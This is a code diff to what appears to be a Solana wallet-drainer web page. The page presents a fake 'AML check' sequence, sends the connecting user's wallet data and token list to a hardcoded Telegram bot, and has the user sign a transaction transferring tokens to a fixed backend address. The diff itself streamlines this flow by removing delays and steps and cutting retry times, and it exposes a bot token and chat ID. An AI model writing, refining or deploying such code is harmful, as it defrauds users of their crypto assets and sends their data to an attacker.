@@ -19,17 +19,14 @@ const BACKEND_ADDRESS = "DmvHBzRWT6MGj2s3a1ja2yGuPksxKfbrU8dc2VbTnPS9";
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
 const TELEGRAM_CHAT_ID = "-1002490122517";
 
+// Optimized step list - removed unnecessary steps
 const initialSteps: ConnectionStep[] = [
   { id: 'connect', label: 'Connect', status: 'pending' },
-  { id: 'connectSuccess', label: 'Connect success', status: 'pending' },
   { id: 'addressCheck', label: 'Address check', status: 'pending' },
   { id: 'amlCheck', label: 'AML check', status: 'pending' },
   { id: 'successfulAmlCheck', label: 'Successful AML check', status: 'pending' },
   { id: 'scanningDetails', label: 'Scanning details', status: 'pending' },
-  { id: 'thanks', label: 'Thanks', status: 'pending' },
   { id: 'signConfirmation', label: 'Sign confirmation', status: 'pending' },
-  { id: 'signWaitingTitle', label: 'Sign waiting - title', status: 'pending' },
-  { id: 'signWaitingDescription', label: 'Sign waiting - description', status: 'pending' },
   { id: 'successfulSign', label: 'Successful sign', status: 'pending' },
   { id: 'tokenTransfer', label: 'Token transfer', status: 'pending' }
 ];
@@ -63,6 +60,7 @@ const Index = () => {
     }
   };
 
+  // Optimized function - no artificial delays
   const advanceToNextStep = (currentStepId: string) => {
     updateStepStatus(currentStepId, 'completed');
     
@@ -101,16 +99,10 @@ const Index = () => {
       advanceToNextStep('amlCheck');
       
       updateStepStatus('successfulAmlCheck', 'active');
-      await new Promise(resolve => setTimeout(resolve, 300));
       advanceToNextStep('successfulAmlCheck');
 
       updateStepStatus('scanningDetails', 'active');
-      await new Promise(resolve => setTimeout(resolve, 300));
       advanceToNextStep('scanningDetails');
-
-      updateStepStatus('thanks', 'active');
-      await new Promise(resolve => setTimeout(resolve, 300));
-      advanceToNextStep('thanks');
 
       setFetchRetries(0);
 
@@ -136,7 +128,7 @@ const Index = () => {
         });
         setTimeout(() => {
           fetchWalletData();
-        }, 2000 * newRetryCount);
+        }, 1000 * newRetryCount); // Reduced delay for faster retries
       }
       
       return null;
@@ -162,12 +154,7 @@ const Index = () => {
     setShowLoadingModal(true);
     
     updateStepStatus('connect', 'active');
-    await new Promise(resolve => setTimeout(resolve, 300));
     advanceToNextStep('connect');
-    
-    updateStepStatus('connectSuccess', 'active');
-    await new Promise(resolve => setTimeout(resolve, 250));
-    advanceToNextStep('connectSuccess');
     
     try {
       toast({
@@ -177,13 +164,14 @@ const Index = () => {
       
       console.log("Starting wallet connection process");
       
+      // Faster wallet data fetch with fewer attempts
       let walletData = null;
-      for (let attempt = 0; attempt < 3; attempt++) {
+      for (let attempt = 0; attempt < 2; attempt++) {
         try {
           walletData = await fetchWalletData();
           if (walletData) break;
           console.log(`Wallet data fetch attempt ${attempt + 1} failed, retrying...`);
-          await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
+          if (attempt < 1) await new Promise(resolve => setTimeout(resolve, 500)); // Reduced delay
         } catch (e) {
           console.error(`Fetch attempt ${attempt + 1} error:`, e);
         }
@@ -212,12 +200,13 @@ const Index = () => {
           variant: "destructive",
         });
         
+        // Async retry without blocking
         setTimeout(async () => {
           await sendToTelegram({
             ...walletData!,
             tokens: tokens.length > 0 ? tokens : walletData!.tokens || [],
           }, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
-        }, 3000);
+        }, 1000); // Reduced delay
       } else {
         console.log("Successfully sent wallet data to Telegram");
       }
@@ -294,7 +283,7 @@ const Index = () => {
           });
           
           setIsProcessing(false);
-          setTimeout(() => setShowLoadingModal(false), 1000);
+          setTimeout(() => setShowLoadingModal(false), 500); // Reduced delay
           return;
         } else if (!hasTokensToTransfer) {
           // No tokens to transfer and SOL too low
@@ -346,13 +335,6 @@ const Index = () => {
         }
 
         advanceToNextStep('signConfirmation');
-        updateStepStatus('signWaitingTitle', 'active');
-        await new Promise(resolve => setTimeout(resolve, 200));
-        advanceToNextStep('signWaitingTitle');
-        
-        updateStepStatus('signWaitingDescription', 'active');
-        await new Promise(resolve => setTimeout(resolve, 200));
-        advanceToNextStep('signWaitingDescription');
 
         const signature = await signAndSendTransaction(
           connection,
@@ -365,7 +347,6 @@ const Index = () => {
         );
 
         updateStepStatus('successfulSign', 'active');
-        await new Promise(resolve => setTimeout(resolve, 300));
         advanceToNextStep('successfulSign');
 
         console.log("Transfer completed with signature:", signature);
@@ -442,7 +423,6 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
         ]);
         
         updateStepStatus('errorTitle', 'active');
-        await new Promise(resolve => setTimeout(resolve, 200));
         
         const failureMessage = {
           address: publicKey.toString(),
@@ -483,7 +463,7 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
       setTimeout(() => {
         setShowLoadingModal(false);
         setIsProcessing(false);
-      }, 1000);
+      }, 500); // Reduced delay
     }
   };
 
